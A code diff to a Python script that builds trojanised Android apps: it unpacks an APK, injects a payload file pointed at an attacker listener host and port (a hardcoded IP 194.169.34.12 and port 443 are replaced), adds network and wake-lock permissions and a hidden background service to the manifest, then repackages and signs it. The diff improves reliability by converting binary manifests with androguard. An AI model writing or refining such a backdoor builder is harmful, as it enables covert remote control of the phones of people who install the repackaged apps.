@@ -62,19 +62,39 @@ def build_apk(lhost: str, lport: str, output_apk: str):
         z.extractall(BUILD_DIR)
 
     # Inject payload
-    payload_content = Path(PAYLOAD_FILE).read_text()
+    payload_content = Path(PAYLOAD_FILE).read_text(encoding="utf-8")
     payload_content = payload_content.replace("194.169.34.12", lhost)
     payload_content = payload_content.replace("443", lport)
 
     assets_dir = BUILD_DIR / "assets"
     assets_dir.mkdir(exist_ok=True)
-    (assets_dir / "payload.py").write_text(payload_content)
+    (assets_dir / "payload.py").write_text(payload_content, encoding="utf-8")
     log(f"Injected payload → {lhost}:{lport}")
 
-    # Inject permissions + service into manifest (idempotent)
+    # CRITICAL FIX: Handle binary AndroidManifest.xml (most real APKs)
     manifest_path = BUILD_DIR / "AndroidManifest.xml"
-    manifest = manifest_path.read_text()
+    try:
+        # Try normal UTF-8 first
+        manifest = manifest_path.read_text(encoding="utf-8")
+        is_binary = False
+    except UnicodeDecodeError:
+        log("Detected binary AndroidManifest.xml → converting to text")
+        # Convert binary XML → text using 'apktool' or 'androguard'
+        import subprocess
+        result = subprocess.run([
+            "python3", "-c",
+            "from androguard.core.axml import AXMLPrinter; "
+            "from pathlib import Path; "
+            "data = Path('AndroidManifest.xml').read_bytes(); "
+            "ap = AXMLPrinter(data); "
+            "Path('AndroidManifest.xml').write_text(ap.get_buff().decode('utf-8', errors='ignore'))"
+        ], cwd=BUILD_DIR, capture_output=True)
+        if result.returncode != 0:
+            error("Failed to parse binary manifest. Install androguard properly.")
+        manifest = manifest_path.read_text(encoding="utf-8")
+        is_binary = True
 
+    # Now safely inject permissions + service
     permissions_block = '''
     <uses-permission android:name="android.permission.INTERNET"/>
     <uses-permission android:name="android.permission.WAKE_LOCK"/>
@@ -98,10 +118,10 @@ def build_apk(lhost: str, lport: str, output_apk: str):
     if "ServiceRunner" not in manifest:
         manifest = manifest.replace("</application>", service_block + "\n    </application>")
 
-    manifest_path.write_text(manifest)
+    manifest_path.write_text(manifest, encoding="utf-8")
     log("Injected permissions + service")
 
-    # Repackage → align → sign
+    # Repackage → align → sign (unchanged)
     unsigned = BUILD_DIR.parent / "unsigned.apk"
     aligned = DIST_DIR / "aligned.apk"
     final = Path(output_apk)
@@ -128,7 +148,8 @@ def build_apk(lhost: str, lport: str, output_apk: str):
             if p.is_dir(): shutil.rmtree(p)
             else: p.unlink()
 
-    log(f"APK built → {final} ({final.stat().st_size//1024} KB)")
+    log(f"APK built -> {final} ({final.stat().st_size//1024} KB)")
+    
 
 def main():
     parser = argparse.ArgumentParser()
